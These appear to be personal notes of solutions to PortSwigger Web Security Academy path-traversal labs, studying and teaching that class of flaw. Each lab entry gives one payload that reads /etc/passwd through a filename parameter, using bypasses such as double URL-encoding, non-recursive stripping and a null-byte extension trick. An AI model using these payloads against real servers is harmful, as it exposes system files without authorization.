
File path traversal, simple case

From <https://portswigger.net/web-security/file-path-traversal/lab-simple> 


Path traversal

Simple
```
/../../../etc/passwd
```

From <https://portswigger.net/web-security/file-path-traversal/lab-simple> 


File path traversal, traversal sequences blocked with absolute path bypass

From <https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass> 

```
image?filename=/../../../etc/passwd
```



File path traversal, traversal sequences stripped non-recursively

From <https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively> 

```
image?filename=....//....//....//etc/passwd
```

From <https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively> 


File path traversal, traversal sequences stripped with superfluous URL-decode

From <https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode> 
Double urlencode

```
image?filename=..%252f..%252f..%252fetc/passwd
```

From <https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode> 


File path traversal, validation of start of path

From <https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path> 


```
image?filename=/var/www/images/../../../etc/passwd
```

From <https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path> 

File path traversal, validation of file extension with null byte bypass

From <https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass> 
```
image?filename=/../../../etc/passwd%00.png
```

From <https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass> 

